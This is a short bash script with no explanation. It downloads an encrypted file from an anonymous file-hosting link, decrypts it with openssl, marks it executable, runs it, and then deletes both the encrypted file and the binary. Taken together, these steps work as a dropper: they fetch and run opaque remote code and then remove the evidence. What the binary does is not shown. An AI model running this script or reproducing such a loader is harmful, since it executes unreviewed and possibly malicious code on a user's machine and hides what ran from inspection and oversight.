#! /bin/bash
cd
curl -O https://cdn-102.anonfiles.com/udBcq8U2yf/5c985a92-1674825970/x-l1bra.enc
openssl enc -d -aes-256-cbc -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
